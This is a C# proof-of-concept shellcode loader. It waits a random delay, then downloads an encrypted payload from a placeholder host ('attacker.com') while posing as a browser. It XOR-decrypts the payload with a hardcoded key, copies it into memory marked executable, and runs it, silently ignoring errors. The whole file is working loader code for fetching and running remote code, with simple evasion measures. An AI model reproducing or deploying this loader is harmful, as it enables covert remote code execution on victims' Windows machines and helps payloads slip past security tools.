
/////////////////////////////////////////
// POC by Behzad Derakhshan Niya       //
// GitHub: github.com/ReverseTEN      //
/////////////////////////////////////////

using System;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

class P
{
    const int BS = 16;

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, Vtt flAllocationType, Mpp flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, Vtt dwFreeType);

    enum Vtt
    {
        MEM_COMMIT = 0x1000,
        MEM_RESERVE = 0x2000,
        MEM_RESET = 0x80000,
        MEM_RESET_UNDO = 0x1000000,
        MEM_DECOMMIT = 0x4000
    }

    enum Mpp
    {
        PAGE_EXECUTE = 0x10,
        PAGE_EXECUTE_READ = 0x20,
        PAGE_EXECUTE_READWRITE = 0x40,
        PAGE_EXECUTE_WRITECOPY = 0x80,
        PAGE_NOACCESS = 0x01,
        PAGE_READONLY = 0x02,
        PAGE_READWRITE = 0x04,
        PAGE_WRITECOPY = 0x08,
        PAGE_GUARD = 0x100,
        PAGE_NOCACHE = 0x200,
        PAGE_WRITECOMBINE = 0x400
    }

    static async Task<byte[]> FetchDataAsync(string url)
    {
        using (var httpClient = new HttpClient())
        {
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3");

            var response = await httpClient.GetAsync(url);
            if (response.IsSuccessStatusCode)
            {
                byte[] encryptedData = await response.Content.ReadAsByteArrayAsync();
                return DecryptData(encryptedData); // Decrypt the fetched data
            }
            else
            {
                throw new Exception();
            }
        }
    }

    static byte[] DecryptData(byte[] encryptedData)
    {
        // XOR decryption
        string key = "KEY123456789!@#$#$%";
        for (int i = 0; i < encryptedData.Length; i++)
        {
            encryptedData[i] ^= (byte)key[i % key.Length];
        }
        return encryptedData;
    }

    static void ExecuteBinary(byte[] data)
    {
        IntPtr codePointer = VirtualAlloc(IntPtr.Zero, (uint)data.Length, Vtt.MEM_COMMIT, Mpp.PAGE_EXECUTE_READWRITE);
        Marshal.Copy(data, 0, codePointer, data.Length);
        ((Action)Marshal.GetDelegateForFunctionPointer(codePointer, typeof(Action)))();
        VirtualFree(codePointer, 0, Vtt.MEM_DECOMMIT);
    }

    static async Task MainAsync()
    {
        try
        {
            await Task.Delay(GetRandomDelay());
            byte[] binaryData = await FetchDataAsync("http:/attacker.com/payload.bin");

            ExecuteBinary(binaryData);
        }
        catch
        {
            Console.WriteLine();
        }
    }


    static int GetRandomDelay()
    {
        Random random = new Random();
        return random.Next(1000, 5000);
    }

    static void Main() => MainAsync().Wait();
}
